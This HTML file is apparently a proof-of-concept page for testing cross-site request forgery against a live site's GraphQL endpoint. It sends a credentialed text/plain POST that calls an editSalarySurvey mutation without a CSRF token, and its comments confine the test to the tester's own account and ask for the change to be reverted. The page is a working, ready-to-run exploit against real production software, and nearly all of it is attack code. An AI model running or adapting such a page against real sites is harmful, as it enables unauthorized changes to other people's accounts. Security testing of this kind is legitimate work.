<!DOCTYPE html>
<!--
CSRF test for editSalarySurvey mutation on glassdoor.com.

Why this matters: every captured request uses a STATIC Gd-Csrf-Token
value ("1") instead of a per-session unguessable token. That alone is
suspicious, but the real CSRF question is whether the server-side state
change can happen AT ALL from a cross-origin page using only the
browser's ambient session cookie - with NO custom header - since a
custom header forces a CORS preflight that a real attacker-controlled
page would fail.

This page deliberately sends:
  - credentials: 'include'   (so the browser attaches your real
    glassdoor.com session cookies automatically, like a real CSRF would)
  - Content-Type: text/plain (keeps this a "simple request" - no
    preflight, no custom headers at all - closest to what a real
    attacker page could do)
  - NO Gd-Csrf-Token header

It targets YOUR OWN salaryReviewId (you fill it in below) and changes
ONLY `lastYearAtEmployer` to a distinct, obviously-test value (99) so
you can immediately confirm the change in the UI and revert it right
after, win or lose.

HOW TO USE:
  1. Log into glassdoor.com in this same browser first (normal session).
  2. Edit SALARY_REVIEW_ID below to one of YOUR OWN real salaryReviewIds.
  3. Open this file directly in the browser (File > Open, or double-click).
  4. Click the button. Read the result on the page.
  5. Whatever happens, go to glassdoor.com and check/revert
     lastYearAtEmployer on that entry back to its original value.
-->
<html lang="en">
<head>
<meta charset="utf-8">
<title>CSRF PoC - editSalarySurvey (own account only)</title>
</head>
<body>
<h3>CSRF test: cross-origin editSalarySurvey (no Gd-Csrf-Token header, text/plain body)</h3>
<p>Target salaryReviewId: <code id="sid"></code> (edit SALARY_REVIEW_ID in the script below before using)</p>
<button id="go">Fire cross-origin request</button>
<pre id="out">(not run yet)</pre>

<script>
// EDIT THIS to one of YOUR OWN salaryReviewIds before testing.
const SALARY_REVIEW_ID = 102909088;

document.getElementById('sid').textContent = SALARY_REVIEW_ID;

document.getElementById('go').addEventListener('click', async () => {
  const out = document.getElementById('out');
  out.textContent = 'Sending...';

  const query = `
  mutation EditSalarySurvey(
    $compensationInput: CompensationInput
    $currentJob: Boolean
    $lastYearAtEmployer: Int
    $salaryReviewId: Int!
  ) {
    editSalarySurvey(
      input: {
        compensationInput: $compensationInput
        currentJob: $currentJob
        lastYearAtEmployer: $lastYearAtEmployer
        salaryReviewId: $salaryReviewId
      }
    ) {
      salaryReviewId
    }
  }`;

  const body = JSON.stringify({
    query,
    variables: {
      compensationInput: null,
      currentJob: true,
      lastYearAtEmployer: 99,   // obvious marker value - revert after
      salaryReviewId: SALARY_REVIEW_ID,
    },
  });

  try {
    // credentials:'include' + simple content-type => no CORS preflight,
    // no custom headers at all. This is the closest thing to what a
    // real attacker-hosted page could send.
    const resp = await fetch('https://www.glassdoor.com/graph', {
      method: 'POST',
      credentials: 'include',
      mode: 'cors',
      headers: { 'Content-Type': 'text/plain' },
      body,
    });
    const status = resp.status;
    let text = '(opaque/unreadable due to CORS - that is EXPECTED)';
    try { text = await resp.text(); } catch (e) {}
    out.textContent =
      `HTTP status (if readable): ${status}\n` +
      `Response body (if readable): ${text}\n\n` +
      `IMPORTANT: even if the browser blocks you from READING the ` +
      `response (CORS), the request may still have been PROCESSED ` +
      `server-side. The real test is: go check glassdoor.com now and ` +
      `see if lastYearAtEmployer actually changed to 99 on that entry.`;
  } catch (e) {
    out.textContent = 'Request failed to send at all: ' + e;
  }
});
</script>
</body>
</html>
